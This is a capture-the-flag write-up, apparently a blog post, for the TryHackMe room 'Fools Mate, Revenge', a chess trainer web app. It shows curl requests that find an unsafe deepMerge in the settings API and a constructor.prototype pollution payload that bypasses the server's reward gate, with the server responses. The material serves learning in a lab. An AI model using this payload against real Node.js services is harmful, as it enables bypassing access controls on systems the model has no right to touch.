---
title: "TryHackMe: Fools Mate, Revenge"
author: '0x6D4E6D'
categories: [TryHackMe]
tags: [web, api, prototype-pollution, deep-merge, access-control-bypass]
render_with_liquid: false
media_subpath: /assets/images/tryhackme_foolsmate_revenge
image:
  path: room-img.png
---
## Overview

I see my client-side defences were no match for you, well done, my apprentice! Let's see if you have what it takes to claim your prize.
Room Link: [Fools Mate, Revenge](https://tryhackme.com/room/foolsm8v2)

## Recon

The target web application was available at:

```txt
http://10.114.172.42:3000/
```

I started with basic enumeration. As in the first challenge, the useful part was the web application itself, so I moved to manual inspection.

When opening the page, the application displayed another Endgame Trainer chess board.

![Landing page](01-landing.png)

The board was again a simple mate-in-one position.

The intended winning move was:

```txt
from: a1
to: a8
```

---

## Testing the Checkmate Move

First, I tested the move directly through the backend API.

I set the target and session cookie:

```bash
TARGET="http://10.114.172.42:3000"
SID="c72475942515c86fb13f17ea950b07e0"
```

Then I reset the board:

```bash
curl -s -X POST "$TARGET/api/reset" \
  -H "Cookie: sid=$SID" | jq
```

Response:

```json
{
  "ok": true,
  "fen": "6k1/5ppp/8/8/8/8/5PPP/R5K1 w - - 0 1",
  "status": "ongoing",
  "turn": "w"
}
```

After that, I sent the checkmate move:

```bash
curl -s -X POST "$TARGET/api/move" \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=$SID" \
  -d '{"from":"a1","to":"a8"}' | jq
```

The backend accepted the move, but did not return the flag:

```json
{
  "ok": true,
  "move": "a1a8",
  "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

This response gave the important clue:

```txt
session.config.unlocked is not set
```

So the checkmate was valid, but the reward depended on a server-side session value:

```js
session.config.unlocked
```

---

## Inspecting the Frontend

I inspected the frontend `/js/app.js` JavaScript and found that the application included a preferences panel.

The preferences were sent to the backend endpoint:

```txt
POST /api/settings
```

The frontend sent user-controlled JSON data such as:

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180
}
```

This made `/api/settings` interesting because it accepted JSON input and updated server-side settings.

The goal became to find out whether this settings endpoint could affect the reward gate.

---

## Testing the Settings Endpoint

I first sent a normal settings request:

```bash
curl -s -X POST "$TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=$SID" \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180}' | jq
```

The response showed that the settings were accepted:

```json
{
  "ok": true,
  "preferences": {
    "theme": "forest",
    "pieceSet": "classic",
    "animationMs": 180
  }
}
```

Next, I tried to set fields such as `unlocked`, `config.unlocked`, and other reward-related values directly.

Example:

```bash
curl -s -X POST "$TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=$SID" \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"config":{"unlocked":true}}' | jq
```

The server still returned only the normal preferences object, and the reward remained locked.

So direct assignment was not enough.

---

## Discovering Unsafe Deep Merge

Then I tested prototype pollution payloads.

When sending payloads containing `__proto__` or `constructor.prototype`, the server returned an error:

```bash
curl -i -s -X POST "$TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=$SID" \
  -d '{"constructor":{"prototype":{"config":{"unlocked":true}}}}'
```

The server responded with a 500 error:

```txt
HTTP/1.1 500 Internal Server Error
```

The error output revealed the vulnerable function:

```txt
RangeError: Maximum call stack size exceeded
at deepMerge (/opt/ctf/chess-e2/server.js:28:19)
at deepMerge (/opt/ctf/chess-e2/server.js:33:7)
at deepMerge (/opt/ctf/chess-e2/server.js:33:7)
```
![Landing page](02-deepmerge.png)

This confirmed that the backend was using an unsafe recursive `deepMerge()` function.

The endpoint was likely merging user-controlled JSON into an object without properly blocking dangerous keys such as:

```txt
__proto__
constructor
prototype
```

This is a classic prototype pollution scenario.

---

## Exploitation

Since the reward gate checked:

```js
session.config.unlocked
```

I needed to make `unlocked` available through object prototype pollution.

The payload that worked was based on `constructor.prototype`:

```bash
curl -i -s -X POST "$TARGET/api/settings" \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=$SID" \
  -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"unlocked":true}}}'
```

This request caused the vulnerable deep merge logic to process the `constructor.prototype` object.

After that, I reset the board:

```bash
curl -s -X POST "$TARGET/api/reset" \
  -H "Cookie: sid=$SID" | jq
```

Then I sent the normal checkmate move again:

```bash
curl -s -X POST "$TARGET/api/move" \
  -H "Content-Type: application/json" \
  -H "Cookie: sid=$SID" \
  -d '{"from":"a1","to":"a8"}' | jq
```

This time, the reward gate was bypassed and the backend returned the flag.



The final response was:

```json
{
  "ok": true,
  "move": "a1a8",
  "fen": "R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "flag": "THM{REDACTED}"
}
```
